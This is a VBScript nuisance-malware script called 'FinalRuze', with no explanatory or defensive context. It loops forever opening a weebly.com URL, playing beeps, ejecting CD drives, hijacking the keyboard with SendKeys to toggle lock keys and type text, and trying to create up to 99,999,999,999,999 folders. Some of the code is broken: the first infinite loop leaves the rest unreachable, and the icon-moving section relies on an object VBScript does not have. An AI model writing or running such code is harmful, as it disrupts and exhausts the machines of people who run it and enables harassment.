Option Explicit

Dim objShell, objShellApp, objDesktop, objFolder, objItem, xPos, yPos, ts, strDriveLetter, intDriveLetter, fs, colCDROMs, d, oWMP, i, folder_name
Const CDROM = 4
Const num_folders = 99999999999999
Dim base_folder_name

' Open website loop
Do While True
    CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
    CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
    WScript.Sleep 5000
Loop

' Beep sound loop
Do While True
    CreateObject("WScript.Shell").Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
Loop

' Move desktop items loop
Set objShell = WScript.CreateObject("WScript.Shell")
Set objShellApp = CreateObject("Shell.Application")
Set objDesktop = objShellApp.Namespace(0)
Set objFolder = objDesktop.Self
Do While True
    For Each objItem In objFolder.Items
        Randomize
        xPos = Int((Screen.Width - objItem.Width) * Rnd)
        yPos = Int((Screen.Height - objItem.Height) * Rnd)
        objShellApp.MoveItem objItem, xPos, yPos
    Next
    WScript.Sleep 5000
Loop

' Eject CD loop
Do
    Set fs = CreateObject("Scripting.FileSystemObject")
    strDriveLetter = ""
    For intDriveLetter = Asc("A") To Asc("Z")
        Err.Clear
        If fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then
            If Err.Number = 0 Then
                strDriveLetter = Chr(intDriveLetter)
                Exit For
            End If
        End If
    Next
    Set oWMP = CreateObject("WMPlayer.OCX.7" )
    Set colCDROMs = oWMP.cdromCollection
    For d = 0 to colCDROMs.Count - 1
        colCDROMs.Item(d).Eject
    Next
    For d = 0 to colCDROMs.Count - 1
        colCDROMs.Item(d).Eject
    Next
    set owmp = nothing
    set colCDROMs = nothing
    WScript.Sleep 5000
loop

' Create many folders
base_folder_name = "FinalRuze"
For i = 1 To num_folders
    folder_name = base_folder_name & i
    CreateObject("Scripting.FileSystemObject").CreateFolder folder_name
    WScript.Echo "Created folder: " & folder_name
Next

' Type some text and toggle lock keys
set objShell = wscript.createobject ("wscript.shell")
do
    wscript.sleep 100
    objShell.sendkeys "{CAPSLOCK}"
    objShell.sendkeys "{NUMLOCK}"
    objShell.sendkeys "This is the FinalRuze"
    objShell.sendkeys "{SCROLLLOCK}"
loop
